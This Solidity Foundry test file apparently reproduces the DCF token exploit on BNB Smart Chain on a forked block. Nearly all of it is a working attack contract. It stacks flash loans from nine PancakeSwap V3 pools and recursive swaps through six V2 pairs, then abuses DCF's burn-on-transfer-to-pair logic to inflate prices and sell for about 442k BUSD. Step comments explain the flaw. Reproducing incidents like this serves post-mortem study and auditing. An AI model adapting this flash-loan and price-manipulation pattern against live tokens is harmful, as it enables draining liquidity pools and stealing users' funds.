// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import {Test, console} from "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~442k
// Attacker : https://bscscan.com/address/0x00c58434f247dfdca49b9ee82f3013bac96f60ff
// Attack Contract : https://bscscan.com/address/0x77ab960503659711498a4c0bc99a84e8d0a47589
// Vulnerable Contract : https://bscscan.com/address/0x8487f846d59f8fb4f1285c64086b47e2626c01b6
// Attack Tx : https://bscscan.com/tx/0xb375932951c271606360b6bf4287d080c5601f4f59452b0484ea6c856defd6fd

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x8487f846d59f8fb4f1285c64086b47e2626c01b6#code

// @Analysis
// Twitter Guy : https://x.com/Phalcon_xyz/status/1860890801909190664
// Hacking God [EN]: https://lunaray.medium.com/dcf-hack-analysis-dbcd3589c6fc
// Hacking God [中]: https://www.panewslab.com/zh_hk/articledetails/nvh5p8pjf4go.html

address constant BUSD_addr = 0x55d398326f99059fF775485246999027B3197955;
address constant DCF_addr = 0xA7e92345ddF541Aa5CF60feE2a0e721C50Ca1adb;
address constant DCT_addr = 0x56f46bD073E9978Eb6984C0c3e5c661407c3A447;
address constant PancakeSwapRouterv2_addr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PancakeSwapV2_BSCUSD_DCF_12_addr = 0x8487f846d59F8FB4f1285C64086b47e2626C01B6;
address constant PancakeSwapV2_BSCUSD_DCT_6_addr = 0x5aaC7375196e9eA76b1598ed4BE19B41fA5Ba651;


contract DCFToken is Test {
    IBEP20 DCF = IBEP20(0xA7e92345ddF541Aa5CF60feE2a0e721C50Ca1adb);
    Attack_Contract attack_Contract;

    function setUp() public {
        vm.createSelectFork("bsc", 44290969);
        vm.startPrank(0x00c58434F247DFdCA49b9EE82f3013BAC96F60FF, 0x00c58434F247DFdCA49b9EE82f3013BAC96F60FF);

        attack_Contract = new Attack_Contract();
        DCF.approve(address(attack_Contract), 416_258_263_298_472_398_299);
    }

    function testExploit() public {
        attack_Contract.exploit();
    }
}

contract Attack_Contract {
    struct Pancake {
        address addr;
        uint amount;
        bool bUSDIndex;
    }
    address[] path = new address[](2);
    Pancake[] pancakeV3Pools;
    Pancake[] pancakeSwapV2s;
    IBEP20 BUSD = IBEP20(BUSD_addr);
    IBEP20 DCF = IBEP20(DCF_addr);
    IBEP20 DCT = IBEP20(DCT_addr);
    
    uint deadline = 1732453876;
    uint step = 1;
    IPancakeSwapRouterV2 PancakeSwapRouterV2 = IPancakeSwapRouterV2(PancakeSwapRouterv2_addr);
    IPancakeSwapV2 PancakeSwapV2_BSCUSD_DCF_12 = IPancakeSwapV2(PancakeSwapV2_BSCUSD_DCF_12_addr);
    IPancakeSwapV2 PancakeSwapV2_BSCUSD_DCT_6 = IPancakeSwapV2(PancakeSwapV2_BSCUSD_DCT_6_addr);

    constructor() {
        // pancakeV3Pools - Used to obtain a large amount of BUSD via flash loans
        pancakeV3Pools.push(Pancake({addr: 0x92b7807bF19b7DDdf89b706143896d05228f3121, amount: 0, bUSDIndex: false}));
        pancakeV3Pools.push(Pancake({addr: 0x36696169C63e42cd08ce11f5deeBbCeBae652050, amount: 0, bUSDIndex: false}));
        pancakeV3Pools.push(Pancake({addr: 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb, amount: 0, bUSDIndex: false}));
        pancakeV3Pools.push(Pancake({addr: 0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4, amount: 0, bUSDIndex: false}));
        pancakeV3Pools.push(Pancake({addr: 0x172fcD41E0913e95784454622d1c3724f546f849, amount: 0, bUSDIndex: false}));
        pancakeV3Pools.push(Pancake({addr: 0xBe141893E4c6AD9272e8C04BAB7E6a10604501a5, amount: 0, bUSDIndex: true}));
        pancakeV3Pools.push(Pancake({addr: 0x1936be860d93B0Ff98f3a9b83254D61A78930B76, amount: 0, bUSDIndex: true}));
        pancakeV3Pools.push(Pancake({addr: 0x247f51881d1E3aE0f759AFB801413a6C948Ef442, amount: 0, bUSDIndex: false}));
        pancakeV3Pools.push(Pancake({addr: 0x7f51c8AaA6B0599aBd16674e2b17FEc7a9f674A1, amount: 0, bUSDIndex: true}));
        // pancakeSwapV2s - Utilize swap to acquire a large amount of BUSD
        pancakeSwapV2s.push(Pancake({addr: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, amount: 0, bUSDIndex: false}));
        pancakeSwapV2s.push(Pancake({addr: 0x7C1f8F5d8d000b00a2Eaa3c21071dBca18f6825d, amount: 0, bUSDIndex: false}));
        pancakeSwapV2s.push(Pancake({addr: 0xF31cb18759FE8356348c81268b859d2a32bf2117, amount: 0, bUSDIndex: false}));
        pancakeSwapV2s.push(Pancake({addr: 0x5a5fD4DBF70747E684F43B43aB53d4b0C733293D, amount: 0, bUSDIndex: true}));
        pancakeSwapV2s.push(Pancake({addr: 0xB51f9508B88F0868aE14E74C5D7d1F34E2f419c1, amount: 0, bUSDIndex: false}));
        pancakeSwapV2s.push(Pancake({addr: 0x8665A78ccC84D6Df2ACaA4b207d88c6Bc9b70Ec5, amount: 0, bUSDIndex: true}));
    }
    
    function exploit() public {        
        pancakeV3Pools[0].amount = BUSD.balanceOf(pancakeV3Pools[0].addr) - 100_000_000_000_000_000_000;
        
        // Stage 0: Prepare attack funds
        // Borrow a large amount of BUSD from the PancakeSwap V3 pool
        IPancakeV3Pool(pancakeV3Pools[0].addr).flash(address(this), pancakeV3Pools[0].amount, 0, abi.encodePacked(step));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        Pancake storage old_pancakeV3Pool = pancakeV3Pools[step-1];
        old_pancakeV3Pool.bUSDIndex? old_pancakeV3Pool.amount += fee1 : old_pancakeV3Pool.amount += fee0;
         
        if (step < pancakeV3Pools.length) {
            Pancake storage pancakeV3Pool = pancakeV3Pools[step];
            pancakeV3Pool.amount = BUSD.balanceOf(pancakeV3Pool.addr) - 100_000_000_000_000_000_000;
            if (pancakeV3Pool.bUSDIndex)
                IPancakeV3Pool(pancakeV3Pool.addr).flash(address(this), 0, pancakeV3Pool.amount, abi.encode(++step));
            else 
                IPancakeV3Pool(pancakeV3Pool.addr).flash(address(this), pancakeV3Pool.amount, 0, abi.encode(++step));
        }
        else {
            step = 1;
            // Subtract 10^20 to avoid triggering the require check for INSUFFICIENT_LIQUIDITY in the contract
            pancakeSwapV2s[0].amount = BUSD.balanceOf(pancakeSwapV2s[0].addr) - 100_000_000_000_000_000_000;
            // The attacker uses PancakeSwap's swap function, first transferring the swapped tokens out, then paying tokens in the callback function, gaining a large amount of BUSD through a series of recursive swap operations
            IPancakeSwapV2(pancakeSwapV2s[0].addr).swap(pancakeSwapV2s[0].amount, 0, address(this), abi.encodePacked(step));
        }
    }

    function pancakeCall (address sender, uint amount0, uint amount1, bytes calldata data) external {
        Pancake storage old_pancakeSwapV2 = pancakeSwapV2s[step-1];
        // 0.25% for fee
        old_pancakeSwapV2.amount = old_pancakeSwapV2.amount * 100_251 / 100_000;
        
        if (step < pancakeSwapV2s.length){
            Pancake storage pancakeSwapV2 = pancakeSwapV2s[step];
            // Subtract 10^20 to avoid triggering the require check for INSUFFICIENT_LIQUIDITY in the contract
            pancakeSwapV2.amount = BUSD.balanceOf(pancakeSwapV2.addr) - 100_000_000_000_000_000_000;
            if (pancakeSwapV2.bUSDIndex)
                IPancakeSwapV2(pancakeSwapV2.addr).swap(0, pancakeSwapV2.amount, address(this), abi.encode(++step));
            else 
                IPancakeSwapV2(pancakeSwapV2.addr).swap(pancakeSwapV2.amount, 0, address(this), abi.encode(++step));
        }
        else {
            // Step 1: The attacker transfers all the DCF he holds to the attack contract
            DCF.transferFrom(tx.origin, address(this), 83_741_736_701_527_601_701);
            
            // Step 2: The attacker used 80,435,691 BUSD to exchange 4,039 DCF to 0x16600100b04d17451a03575436b4090f6ff8f404.
            BUSD.approve(address(PancakeSwapRouterV2), type(uint256).max);
            (path[0], path[1]) = (address(BUSD), address(DCF));
            PancakeSwapRouterV2.swapExactTokensForTokensSupportingFeeOnTransferTokens(80_435_691_245_080_307_237_888_143, 0, path, 0x16600100b04d17451a03575436B4090f6Ff8f404, deadline);
            
            // Step 3: The attacker used the remaining 29,919,679 BUSD to exchange 1,062,693 DCT for the attack contract
            BUSD.approve(address(PancakeSwapRouterV2), type(uint256).max);
            (path[0], path[1]) = (address(BUSD), address(DCT));
            PancakeSwapRouterV2.swapExactTokensForTokensSupportingFeeOnTransferTokens(29_919_669_280_925_435_923_030_360, 0, path, address(this), deadline);
            
            // Step 4: The attacker uses transfer to send 82 DCF to the PancakeSwap Pair BUSD-DCF
            // Vulnerability: The transfer of DCF
            // When `to` is the address of the PancakeSwap Pair, the code will destroy about half of the transferred DCF amount from the PancakeSwap Pair and increase the prices of DCF and DCT
            DCF.transfer(address(PancakeSwapV2_BSCUSD_DCF_12), 82_756_539_699_156_688_738);
            
            // Final: The attacker sells DCF and DCT, making a profit of 442,028 BUSD
            PancakeSwapV2_BSCUSD_DCF_12.swap(72_612_978_985_490_861_981_525_879, 0, address(this), "");
            BUSD.transfer(address(PancakeSwapV2_BSCUSD_DCT_6), 1_000_000_000_000_000_000);
            DCT.approve(address(PancakeSwapRouterV2), type(uint256).max);
            (path[0], path[1]) = (address(DCT), address(BUSD));
            PancakeSwapRouterV2.swapExactTokensForTokensSupportingFeeOnTransferTokens(1_062_693_418_683_145_675_940_998, 0, path, address(this), deadline);

            // Pay back the flash loan
            for (uint i = 0; i < pancakeV3Pools.length; i++)
                BUSD.transfer(pancakeV3Pools[i].addr, pancakeV3Pools[i].amount);
            // Pay back the swap
            for (uint i = 0; i < pancakeSwapV2s.length; i++)
                BUSD.transfer(pancakeSwapV2s[i].addr, pancakeSwapV2s[i].amount);
        }
    }
}


interface IBEP20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);

}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes memory data) external;
}

interface IPancakeSwapV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
    function sync() external;
}

interface IPancakeSwapRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] memory path, address to, uint256 deadline) external;
}
